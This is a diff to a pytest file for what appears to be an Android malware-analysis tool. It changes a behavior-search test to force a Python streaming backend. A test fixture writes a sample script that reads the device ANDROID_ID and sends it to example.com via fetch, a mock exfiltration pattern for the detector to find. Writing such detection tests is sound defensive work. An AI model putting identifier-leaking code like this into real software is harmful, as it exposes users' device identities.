@@ -55,7 +55,8 @@ def test_network_indicator_extraction_deduplicates_and_records_paths(
     assert result.data["counts"]["websocket"] == 1
 
 
-def test_behavior_search_groups_multiple_research_leads(app_config: AppConfig) -> None:
+def test_behavior_search_groups_multiple_research_leads(app_config: AppConfig, monkeypatch) -> None:
+    monkeypatch.setattr("maldroid.tools.core.triage.shutil.which", lambda _: None)
     case, dispatcher = make_dispatcher(app_config)
     (case.root / "sample.js").write_text(
         "const id = ANDROID_ID;\nfetch('https://example.com', {body: id});\n"
@@ -76,6 +77,7 @@ def test_behavior_search_groups_multiple_research_leads(app_config: AppConfig) -
     assert result.data["totals"]["identifiers"] >= 1
     assert result.data["totals"]["native_bridge"] >= 1
     assert result.data["output_file"].startswith("tool-output/behavior-search-")
+    assert result.data["backend"] == "python-streaming"
 
 
 def test_byte_range_returns_exact_offsets_hex_and_ascii(app_config: AppConfig) -> None:
